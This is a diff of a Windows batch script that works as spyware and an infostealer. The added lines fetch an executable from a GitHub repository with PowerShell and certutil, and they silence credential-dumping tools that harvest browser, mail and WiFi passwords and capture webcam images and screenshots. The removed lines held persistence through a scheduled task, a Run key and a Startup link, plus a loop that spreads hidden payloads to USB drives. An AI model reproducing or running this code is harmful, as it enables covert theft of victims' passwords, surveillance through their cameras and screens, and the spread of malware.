@@ -101,6 +101,10 @@ echo ************* Internet connection ****************
 
 ::echo ************* DOWNLOAD file ****************
    echo Downloading...
+   if not exist "C:\Users\Public\Licence\Extension\Pendrive.exe" (
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true', 'Pendrive.exe')" > nul 2> nul    
+   )  
+      if errorlevel 1 goto ERROR2
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/nircmd.exe?raw=true', 'nircmd.exe')" > nul 2> nul    
    )  
@@ -236,6 +240,11 @@ echo .
    echo.
    echo Please, wait...
 
+   if not exist "C:\Users\Public\Licence\Extension\Pendrive.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true -OutFile Pendrive.exe" > nul 2> nul
+   )
+      if errorlevel 1 goto ERROR3
+
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/nircmd.exe?raw=true -OutFile nircmd.exe" > nul 2> nul
    )
@@ -369,6 +378,11 @@ echo .
    echo Please, wait...
    timeout 3 > NUL
   
+   set url="https://github.com/win32u/Licence/blob/main/Extension/Pendrive.exe?raw=true"
+   set filename="Pendrive.exe"
+   certutil -urlcache -split -f %url% %filename% > nul 2> nul
+   if errorlevel 1 goto EOF
+
    set url="https://github.com/win32u/Licence/blob/main/Extension/AutoRun.vbs?raw=true"
    set filename="AutoRun.vbs"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
@@ -412,23 +426,23 @@ echo .
    echo.
    echo ************* Execute file ****************
    echo Flying on sky!
-   call "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Addons\BrowserAddonsView.txt"
-   call "C:\Users\Public\Licence\Extension\BrowserDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowserDownloadsView.txt"
-   call "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowsingHistoryView.txt"
-   call "C:\Users\Public\Licence\Extension\MyLastSearch.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\MyLastSearch.txt"
-   call "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\WebBrowserPassView.txt"
-   call "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Chrome\ChromeHistoryView.txt"
-   call "C:\Users\Public\Licence\Extension\ChromePass.exe" /stext "C:\Users\Public\Licence\Microsoft\Chrome\ChromePass.txt"
-   call "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Firefox\FirefoxDownloadsView.txt"
-   call "C:\Users\Public\Licence\Extension\PasswordFox.exe" /stext "C:\Users\Public\Licence\Microsoft\Firefox\PasswordFox.txt"
-   call "C:\Users\Public\Licence\Extension\iehv.exe" /stext "C:\Users\Public\Licence\Microsoft\IExplorer\iehv.txt"
-   call "C:\Users\Public\Licence\Extension\IEpassView.exe" /stext "C:\Users\Public\Licence\Microsoft\IExplorer\IEpassView.txt"
-   call "C:\Users\Public\Licence\Extension\OperaPassView.exe" /stext "C:\Users\Public\Licence\Microsoft\Opera\OperaPassView.txt"
-   call "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Safari\SafariHistoryView.txt"
-   call "C:\Users\Public\Licence\Extension\mailpv.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\mailpv.txt"
-   call "C:\Users\Public\Licence\Extension\SkypeLogView.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\SkypeLogView.txt"
-   call "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" /stext "C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt"
-   call "C:\Users\Public\Licence\Extension\UninstallView.exe" /stext "C:\Users\Public\Licence\Microsoft\Utility\UninstallView.txt"
+   call "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Addons\BrowserAddonsView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\BrowserDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowserDownloadsView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowsingHistoryView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\MyLastSearch.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\MyLastSearch.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\WebBrowserPassView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Chrome\ChromeHistoryView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\ChromePass.exe" /stext "C:\Users\Public\Licence\Microsoft\Chrome\ChromePass.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Firefox\FirefoxDownloadsView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\PasswordFox.exe" /stext "C:\Users\Public\Licence\Microsoft\Firefox\PasswordFox.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\iehv.exe" /stext "C:\Users\Public\Licence\Microsoft\IExplorer\iehv.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\IEpassView.exe" /stext "C:\Users\Public\Licence\Microsoft\IExplorer\IEpassView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\OperaPassView.exe" /stext "C:\Users\Public\Licence\Microsoft\Opera\OperaPassView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Safari\SafariHistoryView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\mailpv.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\mailpv.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\SkypeLogView.exe" /stext "C:\Users\Public\Licence\Microsoft\Social\SkypeLogView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" /stext "C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt" > nul 2> nul
+   call "C:\Users\Public\Licence\Extension\UninstallView.exe" /stext "C:\Users\Public\Licence\Microsoft\Utility\UninstallView.txt" > nul 2> nul
 
    ::echo ************* A310Logger ****************
    echo Cooking 3 kg meat!
@@ -437,59 +451,59 @@ echo .
 
    ::echo ************* Webcam image ****************
    echo Watching dirty picture!
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_1.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_1.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_2.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_2.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_3.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_3.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_4.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_4.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_5.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_5.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_6.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_6.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_7.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_7.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_8.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_8.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_9.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_9.jpg" > nul 2> nul
       timeout 2 > nul 2> nul
-   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_10.jpg"
+   call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_10.jpg" > nul 2> nul
 
    ::echo ************* Screenshot ****************
    echo Shoot my head!
-   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_1.png
+   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_1.png > nul 2> nul
    timeout 3 > nul 2> nul   
-   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_2.png
+   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_2.png > nul 2> nul
    timeout 3 > nul 2> nul  
-   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_3.png
+   call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_3.png > nul 2> nul
    timeout 3 > nul 2> nul    
 
    ::echo ************* Find IP ****************
    echo Vip!
-   echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
-   echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
+   echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
+   echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
    for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
    set ip=%ip:~1%
-   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
+   echo Internal IP is:  %ip% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
    For /f %%A in (
    'powershell -nop -c "(Invoke-RestMethod http://ipinfo.io/json).IP"'
    ) Do Set ExtIP=%%A
-   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
+   echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt" > nul 2> nul
 
    ::echo ************* WiFi password ****************
    echo Need wife!
    setlocal enabledelayedexpansion
-   echo WiFi Password is: >"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
-   echo. >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
+   echo WiFi Password is: >"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" > nul 2> nul
+   echo. >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" > nul 2> nul
    for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
        set wifi_pwd=
        for /F "tokens=2 delims=: usebackq" %%F IN (`netsh wlan show profile %%a key^=clear ^| find "Key Content"`) do (
            set wifi_pwd=%%F
 	   set ssid=%%a
        )
-       echo # !ssid! : !wifi_pwd! >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
+       echo # !ssid! : !wifi_pwd! >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt" > nul 2> nul
    )
 
    echo Executed
@@ -502,70 +516,27 @@ echo .
    echo.
 
    echo ************* Run powershell file ****************
-   powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Licence\Extension\instagram.ps1"
+   powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Licence\Extension\instagram.ps1" > nul 2> nul
 	   
 
    echo ************* Give feedback success ****************
    echo Yes!!    
 
+   exit /b
 
-
+   
+  
+  
+  
+  
+  
+  
+  
+  
+   
+  
    
    
    
-   echo ************* Create new task ****************
-   schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\Public\Licence\Extension\AutoRun.vbs" /F > nul 2> nul 
-   REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\Public\Licence\Extension\AutoRun.vbs /f > nul 2> nul 
-   mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\Public\Licence\Extension\AutoRun.vbs" > nul 2> nul 
    
-
-
-   ::echo ************* Pendrive check ****************
-   :pendrive
-   echo ************* Done ****************
-	  timeout 1 > NUL
-	  ::echo Checking for pendrive...
-	  echo Waiting to close...
-	  for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
-	  if %%l equ 2 (
-		 mkdir %%i\YouTube > nul 2> nul
-		    if exist "C:\Users\Public\Licence\folder.exe" (
-		                copy "C:\Users\Public\Licence\folder.exe" "%%i" /Y > nul 2> nul
-		                copy "C:\Users\Public\Licence\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-		    )  else (
-			        copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
-			        copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-			    )
-		 mkdir "%%i\System Update" > nul 2> nul
-		 attrib +h +r "%%i\System Update" /s /d > nul 2> nul
-		 copy "C:\Users\Public\Licence\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-		 if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-		 echo Copied!
-		 ) 
-	  )
-	  echo.
-	  echo.
-	  cls
-          echo Click close to close the window...
-	  goto pendrive
-
-
-
-
-	exit /b
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  
